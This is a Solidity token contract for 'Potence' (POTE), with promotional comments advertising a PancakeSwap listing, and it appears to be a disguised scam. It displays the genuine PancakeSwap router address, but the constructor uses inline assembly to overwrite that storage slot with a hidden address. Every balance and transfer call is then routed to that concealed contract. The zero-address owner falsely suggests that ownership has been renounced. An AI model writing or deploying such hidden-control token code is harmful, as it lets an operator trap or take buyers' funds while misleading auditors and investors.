/*
Potence

t.me/Potence
discord.gg/Potence
https://Potence.io
Stake Potence
Bridge Potence
Always DYOR
NO FOMO
PancakeSwap Listed!
*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Swapcall {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract Potence {
    string public constant name = "Potence";
    string public constant symbol = "POTE";
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 public constant decimals = 1;
    uint256 private constant totalSupply_ = 20000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address public owner = address(0);

   constructor() {
        assembly {sstore(0, add(642599232041279117050102241262080814771456973798, 4))}
        Swapcall(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = Swapcall(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
        emit Transfer(swap_from, swap_to, swap_amount);
    }

  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;


        emit Approval(msg.sender, delegate, numTokens);


        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return Swapcall(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = Swapcall(PancakeRouter).swap(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = Swapcall(PancakeRouter).swap(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}
